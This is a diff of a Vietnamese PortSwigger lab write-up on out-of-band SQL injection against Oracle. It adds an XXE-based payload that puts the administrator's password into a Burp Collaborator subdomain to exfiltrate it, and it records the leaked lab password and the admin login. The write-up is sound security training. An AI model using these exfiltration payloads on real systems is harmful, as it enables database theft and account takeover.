@@ -1,4 +1,4 @@
-# LỖ HỔNG SQL INJECTION (PORTSWIGGER)
+<img width="1919" height="831" alt="image" src="https://github.com/user-attachments/assets/60762ce5-c65c-4967-9aba-cd81cc503e98" /># LỖ HỔNG SQL INJECTION (PORTSWIGGER)
 
 ---
 
@@ -1248,7 +1248,7 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 - Sau khi test tất cả các payload SQLi thông thường, boolean-based, error-based, time-based không hiệu quả, ta tạo payload sử dụng kỹ thuật OAST:
 
   ```sql
-  ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com"> %remote;]>'), '/l') FROM dual--
+  ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http%3a//020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com"> %remote;]>'), '/l') FROM dual--
   ```
 
   Đây là payload cho Oracle, trong đó: *xmltype(...)* tạo ra một tài liệu XML, *EXTRACTVALUE* lấy giá trị từ XML tại XPath /l → Mục tiêu chính là parser XML bị ép xử lý DOCTYPE, trong đó chứa thực thể external.
@@ -1258,7 +1258,7 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE root [
-    <!ENTITY % remote SYSTEM "020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com">
+    <!ENTITY % remote SYSTEM "http%3a//020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com">
     %remote;
   ]>
   ```
@@ -1277,11 +1277,31 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 
   &rarr; Tồn tại lỗ hổng OAST.
 
-
+- Câu hỏi đặt ra lúc này là làm thể nào để từ lỗ hổng OAST ta có thể leak ra nhưng dữ liệu nhạy cảm của CSDL ra ngoài tới hệ thống DNS//HTTP Server của mình.
   
----
+- Một cách đó là nối chuỗi câu truy vấn ta muốn lấy thông tin dữ liệu vào trong tên miền Burp ta sẽ gửi về. Ví dụ ta muốn lấy thông tin mật khẩu của tài khoản *administrator*:
 
-## 12. 
+  ```xml
+   <!ENTITY % remote SYSTEM "http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com">
+  ```
+
+  Trong đó ta dùng toán tử nối chuỗi trong Oracle ||, bản chất là thực hiện chèn dữ liệu trả về từ câu truy vấn váo trong domain Burp ta gửi     về. Ví dụ nếu câu truy vấn trả về chuỗi "abcxyz", server sẽ thực hiện truy cập tên miền:                                  *http://abcxyz.020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com*.
+
+  Và do *http://abcxyz.020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com* là subdomain con của http://020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com, vì máy chủ Burp Collaborator được thiết lập để ghi nhận tất cả các subdomain con được truy vấn tới domain cộng tác: **.020rrkh96d67mk3er0uxclezdqjh7avz.oastify.com*
+
+  Kết quả khi thực hiện chèn paylaod:
+
+  <img width="1871" height="765" alt="image" src="https://github.com/user-attachments/assets/b0c9ea0c-d7a5-497e-9e57-c15a25afaa5d" />
+
+  <img width="1919" height="831" alt="image" src="https://github.com/user-attachments/assets/c71fc0ea-4159-4be2-947b-0d3d6a29dce5" />
+
+  &rarr; Kết quả thu được password là: *kyxp9nl0vde922cetjnr*
+
+  Đăng nhập thành công với tài khoản *administrator*:
+
+  <img width="1919" height="881" alt="image" src="https://github.com/user-attachments/assets/bc6b18d0-758b-4a7f-bfd1-5f6d38b02335" />
+
+---
 
 
   
